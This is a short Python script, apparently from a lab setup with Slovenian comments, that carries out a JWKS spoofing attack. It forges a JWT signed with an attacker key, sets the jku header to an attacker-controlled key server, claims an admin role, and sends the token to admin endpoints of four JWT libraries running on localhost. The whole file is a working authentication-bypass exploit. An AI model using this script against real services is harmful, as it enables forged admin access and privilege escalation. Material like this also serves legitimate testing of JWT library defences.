import requests, base64, json
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

def b64e(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Preberi NAPADALČEV zasebni ključ
with open('../attacker_private.pem', 'rb') as f:
    attacker_private_key = serialization.load_pem_private_key(
        f.read(), password=None, backend=default_backend()
    )

# JWT header kaže na napadalčev JWKS strežnik
header = b64e(json.dumps({
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key",
    "jku": "http://host.docker.internal:9999/"
}))
payload = b64e(json.dumps({
    "user": "hacker",
    "role": "admin",
    "exp": 9999999999
}))

# Napadalčev private key
msg = f"{header}.{payload}".encode()
signature = attacker_private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
forged_token = f"{header}.{payload}.{b64e(signature)}"

print(f"Ponarejen token z jku: {forged_token[:80]}...")

targets = {
    "PyJWT":        "http://localhost:5000/admin",
    "jsonwebtoken": "http://localhost:3000/admin",
    "php-jwt":      "http://localhost:8080/admin",
    "jjwt":         "http://localhost:8081/admin",
}

print("\nJWKS Spoofing rezultati:")
for name, url in targets.items():
    try:
        r = requests.get(url, headers={'Authorization': f'Bearer {forged_token}'})
        print(f"{name}: {r.json()}")
    except Exception as e:
        print(f"{name}: ERROR - {e}")